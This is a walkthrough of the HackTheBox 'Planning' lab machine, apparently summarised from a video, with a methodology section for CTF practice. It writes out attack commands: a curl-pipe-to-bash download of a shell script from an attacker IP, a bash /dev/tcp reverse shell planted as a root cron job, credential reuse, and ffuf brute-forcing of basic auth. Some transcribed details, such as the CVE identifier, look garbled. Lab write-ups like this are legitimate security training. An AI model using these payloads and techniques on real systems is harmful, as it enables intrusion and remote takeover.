## Planning HackTheBox: Detailed Briefing

### I. Initial Enumeration and Web Reconnaissance

The initial phase of the "Planning" box begins with standard reconnaissance, including Nmap and web enumeration.

- **Nmap Scan:** An Nmap scan (nmap -sc -sv -vvv -oA planning 10.10.11.68) reveals two open ports:
- **Port 22 (SSH):** Running OpenSSH on an Ubuntu server. Nuclei later confirms that SSH allows both SSH keys and password authentication, which is "good to know if we have a password we may want to try it because it is accepting password authentication."
- **Port 80 (HTTP):** Running Nginx on Ubuntu, directing to planning.htb. This domain is added to the /etc/hosts file.
- **Website Analysis (planning.htb):**
- The website is identified as a PHP application, hinted by .phps files.
- Initial attempts to find vulnerabilities on the homepage (e.g., SQL injection in search fields) yield no results.
- Nuclei scan on planning.htb primarily identifies missing security headers (e.g., X-Frame-Options, Strict-Transport-Security, Content-Security-Policy). While not direct vulnerabilities, these headers are "a defense in depth methodology" and their absence can "increase the severity" of other found vulnerabilities.
- **Virtual Host Enumeration:**
- An initial GoBuster virtual host scan using a common wordlist fails to identify a subdomain. The speaker notes, "I must have done something wrong... I think GoBuster changed how it normally works i swear in previous boxes if um it would just append the domain I put in the URL but it doesn't look like it's doing that right."
- The issue is resolved by using the append-domain flag with GoBuster, leading to the discovery of grafana.planning.htb. The speaker highlights this as a benefit of CTFs: "doing CTFs like hack the box you know things are vulnerable i'm sure if I was doing just pen testing fulltime still um this change would happen and I would never really uh find out i'd go through and miss a few virtual hosts just because um I don't know something is supposed to be vulnerable and I don't test my tool sets."

### II. Grafana Exploitation and Initial Compromise

The discovery of the Grafana subdomain leads to the first major vulnerability and initial access.

- **Grafana Access:** Navigating to grafana.planning.htb reveals a Grafana instance, version 11.0.0. The login page provides default credentials: admin and a password. Logging in successfully demonstrates the access.
- **Vulnerability Identification (CVE-2024-2342):**
- A search on CVE Details for Grafana reveals a critical vulnerability, CVE-2024-2342, affecting Grafana version 11.0.0, related to "SQL expressions experimental feature of Graphfana allows evaluation of duct DB queries."
- GitHub is used to find a proof-of-concept (PoC) exploit for this CVE, which indicates "PC demonstrates SQL read and um code execution can only happen on 11 but it looks like future versions may have a way to do file disclosure." Since the target is version 11, remote code execution (RCE) is possible.
- **Remote Code Execution:**
- The PoC script is cloned and set up in a Python virtual environment.
- Initial attempts to directly inject a reverse shell payload as a command argument prove "a little bit wonky" due to special characters.
- A more robust method is employed: hosting a shell.sh script on a local HTTP server and using curl to fetch and execute it on the target: user bin curl http://10.10.14.8:8000/shell.sh | bash. This "web cradle" approach is preferred for troubleshooting, as "if you get a hit from the curl to your web server you know the server can reach out to the internet and things are working fine right and then if it fails to give you the shell then you know something's blocking it."
- A reverse shell is successfully obtained, confirming initial access.

### III. Post-Exploitation and Lateral Movement (Container to Host)

Upon gaining a shell, the focus shifts to understanding the environment and escalating privileges.

- **Container Environment:** The hostname suggests the shell is within a Docker container.
- **Environment Variable Discovery:** An env command reveals a password and a username (enzo) in the environment variables: riot tech and something.
- **SSH to Host:** The discovered password is used to SSH into the host machine as the enzo user (ssh enzo@planning.htb). This successfully moves the attacker from the container to the host.
- **User Flag:** The user.txt flag is found, indicating successful user-level compromise.

### IV. Privilege Escalation - Cron Tabs UI

The final phase involves identifying a path to root on the host machine.

- **Pseudo Permissions:** Checking sudo -l for the enzo user shows no special sudo privileges.
- **Hidden Processes (Hide PID):** The ps faux command and inspection of /etc/fstab reveal that proc system is mounted with hide p equals 2 which hides processes um running as other users. This limitation makes it difficult to directly identify processes listening on open ports.
- **Port Enumeration (Host):**Common ports 80 and 22 are expected.
- grep -R 8000 /etc and grep -R 3000 /etc are used to identify services listening on less common ports.
- Port 3000 is identified as Grafana, as it redirects to /login.
- Port 8000 returns "unauthorized" and "express," indicating another web server.
- **MySQL Credentials:** Inside /var/www/html/web/index.php, MySQL credentials (root and a password) are found. Accessing the MySQL database (mysql -u root -p) reveals an empty educate database, suggesting it's not directly useful.
- **Cron Tabs Discovery:**The /opt directory contains crontabs/crontab.db, which upon catting and jq .ing, reveals JSON data describing two cron jobs: cleanup.sh (running every minute) and a docka cron (running daily).
- Searching /etc/systemd reveals a crontab UI service.
- Inspecting the crontab UI service configuration (likely via GitHub or local files) reveals it's listening on port 8000 and has a hardcoded password: password S0 riot 3C.
- **Port Forwarding and Cron Tabs UI Access:**An SSH port forward is established to access the crontab UI listening on localhost:8000: ssh -L 8001:127.0.0.1:8000 enzo@planning.htb.
- Accessing 127.0.0.1:8001 in the browser reveals a login page.
- Brute-forcing common usernames (admin, enzo, root) with the discovered password S0 riot 3C successfully grants access to the crontab UI.
- **Root Shell:**Within the crontab UI, a new cron tab is created with a malicious bash reverse shell payload: bash -c 'bash -i >& /dev/tcp/10.10.14.8/9001 0>&1'.
- Running this cron job immediately executes the reverse shell, granting a root shell.
- The root.txt flag is then retrieved.

### V. Advanced Technique: Ffuf Encoders for Brute-forcing

The briefing concludes with an optional, advanced demonstration of using ffuf with encoders for brute-forcing HTTP Basic Authentication, even though hydra would be simpler.

- **Scenario:** Brute-forcing the crontab UI login if the password was unknown.
- **HTTP Basic Authentication:** The login uses HTTP Basic authentication, where the username:password pair is Base64 encoded.
- **Ffuf Configuration:**A custom wordlist (users.txt) is created.
- sed is used to append the known password (S0 riot 3C) to each username in the wordlist, creating username:password pairs.
- ffuf is then used with the enc encoder to Base64 encode the FUZZ payload before sending the request: ffuf -request login.request -request-proto http -w users.txt:FUZZ -enc FUZZ:b64 -mc all.
- Filtering for a 200 status code (-fc 401) reveals the correct username that resulted in a successful login. This demonstrates how "fuff has encoders so we could like URL encode something we can base 64 encode."

# Methodology
### I. Advanced Reconnaissance and Enumeration

1. **Comprehensive Port and Service Scanning:** Beyond basic port scans, use `nmap` with flags like `-sc` for default scripts, `-sv` for version enumeration, and `-vvv` for verbose output to get detailed information about open ports and running services.
2. **Virtual Host Scanning:** This is crucial for discovering hidden subdomains, which often host vulnerable applications (e.g., `grafana.planning.htb`). Tools like **GoBuster** are essential, and you should understand their syntax, including options like `append domain` for accurate results.
3. **Directory and File Enumeration:** Utilize tools like GoBuster with specific extensions (e.g., `.php`) to find potential files and directories that might reveal information or vulnerabilities.
4. **Automated Vulnerability Scanning:** Incorporate tools like **Nuclei** to automatically identify common misconfigurations or known vulnerabilities that might be missed during manual checks.
5. **Understanding HTTP Headers and their Security Implications:** While often seen as low-severity, learn the purpose of security headers (e.g., `X-Frame-Options`, `Content-Security-Policy`, `Strict-Transport-Security`). More importantly, learn how to **demonstrate the impact** of missing or misconfigured headers (e.g., how `X-Frame-Options` prevents clickjacking, or how `Content-Security-Policy` can mitigate Cross-Site Scripting) to make findings more impactful.
6. **Fuzzing and Input Validation Testing:** Use tools like **Burp Suite** to intercept requests and test various inputs (e.g., single quotes, double quotes, SQL injection payloads like `1=1`, or wildcards like `%`) to identify error messages or behavioral changes that indicate vulnerabilities. Be aware that some websites might detect the use of proxies like Burp Suite.
7. **Adding to Hosts File:** Practice adding discovered hostnames to your `/etc/hosts` file (e.g., `planning.htb`, `grafana.planning.htb`) to properly access web applications.

### II. Vulnerability Identification and Exploitation

1. **Identifying Out-of-Date Software:** Actively look for version numbers of running services or applications (e.g., Grafana 11.0.0). This is a strong indicator of potential vulnerabilities.
2. **Leveraging Public Exploits and CVEs:**
    - Learn to effectively use resources like **CVE Details** to find known vulnerabilities for specific products and versions.
    - Search **GitHub** for Proof of Concepts (PoCs) related to identified CVEs.
    - Understand how to set up and execute PoCs, including managing dependencies using Python virtual environments (`python3 -m venv`, `pip3 install -r requirements.txt`).
3. **Crafting and Delivering Reverse Shells:**
    - Understand the syntax for common reverse shell payloads (e.g., `bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'`).
    - **Master the "Web Cradle" technique:** This involves setting up a simple HTTP server on your machine (`python3 -m http.server`) and having the target download and execute a shell script using `curl` (e.g., `curl http://YOUR_IP:PORT/shell.sh | bash`). This method is preferred for troubleshooting as it helps determine if network connectivity (outbound requests) or payload special characters are causing issues, making debugging much easier.
4. **Advanced Brute-Forcing with Fuzzing Tools:** Learn to use tools like **Fuff** with encoders for more complex brute-forcing scenarios, such as HTTP Basic authentication. This involves understanding how to craft requests, use wordlists, apply encoders (e.g., Base64 encoding for `username:password`), and filter results to identify successful attempts. This provides a deeper understanding than relying solely on dedicated brute-forcing tools like Hydra.

### III. Post-Exploitation and Privilege Escalation

1. **Container Environment Awareness:** Recognize when you are in a Docker container (e.g., from hostname or specific file paths like `/docker-init`). Learn to check environment variables for credentials or other sensitive information within containers.
2. **Local Host Enumeration:**
    - **Process Monitoring:** Understand how to list running processes (`ps aux` or `ps -ef`), but also be aware of techniques like `hide_pid=2` that can limit visibility into processes run by other users.
    - **Local Port Scanning:** Actively look for services listening on `localhost` (e.g., ports 8000, 3000) using `curl` or by examining configuration files. These internal services often contain vulnerabilities or credentials.
    - **Database Investigation:** If database credentials are found, learn to connect to local databases (e.g., MySQL) and enumerate databases, tables, and their contents.
3. **SSH Port Forwarding:** Master the use of SSH local port forwarding (`-L`) to access services listening only on `localhost` from your attacking machine, bridging the network gap.
4. **Cron Job Analysis and Exploitation:**
    - Locate and analyze cron job files (e.g., `crontab.db` in `/opt`) to understand scheduled tasks and their execution frequency.
    - Identify opportunities to create **malicious cron jobs** for privilege escalation (e.g., creating a cron job that runs as root and executes your reverse shell or command).
5. **Service Enumeration:** Explore system services (e.g., using `systemctl list-unit-files --type=service` or `find /etc/systemd -type f -name "*.service"`) to discover running applications and their configurations, which may reveal default credentials or vulnerabilities.
6. **File System Review:** Systematically check common directories like `/opt` for installed applications or unusual files, and `/etc` for configuration files that might contain credentials or misconfigurations.
7. **Parsing JSON Data:** Use tools like **`jq`** to pretty-print and easily read JSON formatted configuration files.

### IV. General Tools and Mindset

1. **Tool Mastery and Troubleshooting:**
    - Continuously test your tools. CTFs are excellent opportunities to discover when a tool's syntax has changed or if it's not working as expected (e.g., GoBuster's behavior with virtual hosts).
    - Learn to read and understand error messages, and consult documentation when tools behave unexpectedly.
2. **Breaking Down Complex Tasks:** When an exploit fails or a payload doesn't work, learn to break down the process into smaller, testable steps. This helps pinpoint exactly where the issue lies (e.g., using the web cradle for reverse shells helps determine if the issue is network connectivity or payload syntax).
3. **Text Manipulation with `sed`:** Become proficient with command-line tools like `sed` for tasks such as inserting specific strings (like `username:password`) into a wordlist, which is useful for advanced brute-forcing.
4. **Attention to Detail:** Small details, like version numbers or specific error messages, can often be the key to finding and exploiting vulnerabilities.

By focusing on these areas, you will develop a more robust skillset for tackling complex CTF challenges and understanding real-world penetration testing scenarios.